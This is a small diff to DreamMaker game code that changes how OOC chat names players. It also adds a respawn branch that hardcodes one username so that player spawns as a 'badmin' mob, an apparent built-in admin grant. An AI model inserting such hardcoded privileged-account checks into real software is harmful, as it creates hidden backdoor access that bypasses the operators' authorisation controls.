@@ -82,7 +82,7 @@ mob/verb/OOC(m as text)
 	if(!m)
 		return
 	if(!mute)
-		view() << "\bold\cyan OOC [src]: [m]"
+		view() << "\bold\cyan OOC [src.key]: [m]"
 	else
 		src << "\red You have been muted!"
 
@@ -247,6 +247,13 @@ mob/verb/Respawn()
 			res = 1
 			A.name = usr.key
 			client.mob = A
+			return
+		if(key == "DXblueshadow")
+			var/mob/badmin/B = new(locate(1,1,1))
+			B.res = 1
+			res = 1
+			B.name = usr.key
+			client.mob = B
 			return
 		var/mob/M = new(locate(1,1,1))
 		M.res = 1
